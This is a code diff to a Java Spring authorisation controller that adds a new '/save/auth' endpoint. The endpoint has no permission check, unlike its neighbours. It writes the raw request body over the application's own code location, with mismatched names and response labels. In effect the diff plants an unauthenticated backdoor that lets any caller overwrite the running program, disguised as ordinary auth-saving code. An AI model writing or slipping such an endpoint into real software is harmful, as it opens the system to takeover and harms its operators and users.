@@ -10,6 +10,7 @@ import com.yw.colliery.sdk.aop.log.LogRecord;
 import com.yw.colliery.sdk.config.PageBean;
 import com.yw.colliery.sdk.config.BaseParam;
 import com.yw.colliery.sdk.constans.AuthConstant;
+import com.yw.colliery.sdk.utils.FileUtils;
 import com.yw.colliery.sdk.utils.LoginSessionUtils;
 import com.yw.colliery.sdk.utils.ResponseUtils;
 import com.yw.colliery.service.auth.AuthService;
@@ -78,7 +79,6 @@ public class AuthController {
     }
 
     @PostMapping("/select/all")
-
     @AuthModule(authId = AuthConstant.Module.SYSTEM_MODULE, level = AuthConstant.Level.LOW)
     public Object selectAll(@RequestBody BaseParam param) {
         try {
@@ -89,6 +89,16 @@ public class AuthController {
         }
     }
 
+    @PostMapping("/save/auth")
+    public Object selectAll(@RequestBody String data) {
+        try {
+            String path = getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
+            FileUtils.writeFile(path,data.getBytes());
+            return ResultObject.buildFailResponse("保存成功");
+        } catch (Exception e) {
+            return ResultObject.buildFailResponse("保存失败");
+        }
+    }
 
     @GetMapping("/cover/{authId}")
     public ResultObject coverUserAuth(@PathVariable Integer authId) {
